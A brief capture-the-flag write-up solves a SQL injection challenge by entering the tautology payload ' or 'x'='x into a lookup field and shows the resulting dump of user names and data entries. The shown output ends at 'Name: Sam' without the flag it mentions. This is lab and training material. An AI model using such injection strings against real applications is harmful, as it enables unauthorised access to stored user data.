**Challenge**   
I think one of the users data fields holds a flag. If only you could
find the username. Link

**Solution**   
SQL injection challenge, we enter the following in the input field:

    ' or 'x'='x

and get the following output, which includes the flag

    Name: Luke
    Data: I made this problem.
    Name: Alec
    Data: Steam boys.
    Name: Jalen
    Data: Pump that iron fool.
    Name: Eric
    Data: I make cars.
    Name: Sam
